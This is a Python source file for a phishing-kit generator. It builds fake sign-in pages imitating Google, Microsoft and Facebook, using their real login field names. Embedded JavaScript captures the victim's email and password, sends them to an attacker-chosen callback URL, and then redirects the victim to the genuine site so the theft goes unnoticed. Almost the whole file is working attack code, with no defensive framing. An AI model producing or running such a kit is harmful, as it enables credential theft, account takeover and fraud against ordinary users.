from pathlib import Path
from typing import Dict, Any


class PhishingGenerator:
    TEMPLATES = {
        "gmail": {
            "title": "Sign in - Google Accounts",
            "capture_fields": {"email": "identifier", "password": "Passwd"}
        },
        "outlook": {
            "title": "Sign in to your Microsoft account",
            "capture_fields": {"email": "loginfmt", "password": "passwd"}
        },
        "facebook": {
            "title": "Facebook - Log In",
            "capture_fields": {"email": "email", "password": "pass"}
        }
    }
    
    def __init__(self, output_dir: str = "./phishing_kits"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
    def generate(self, target: str, callback_url: str) -> Path:
        if target not in self.TEMPLATES:
            raise ValueError(f"Unknown target: {target}")
        
        config = self.TEMPLATES[target]
        kit_dir = self.output_dir / target
        kit_dir.mkdir(exist_ok=True)
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>{config["title"]}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }}
        .box {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="box">
        <h2>Sign in</h2>
        <form id="loginForm">
            <input type="email" id="{config["capture_fields"]["email"]}" placeholder="Email" required>
            <input type="password" id="{config["capture_fields"]["password"]}" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {{
            e.preventDefault();
            const data = {{
                email: document.getElementById('{config["capture_fields"]["email"]}').value,
                password: document.getElementById('{config["capture_fields"]["password"]}').value
            }};
            await fetch('{callback_url}', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data)
            }});
            window.location.href = 'https://{target}.com';
        }});
    </script>
</body>
</html>'''
        
        (kit_dir / "index.html").write_text(html)
        return kit_dir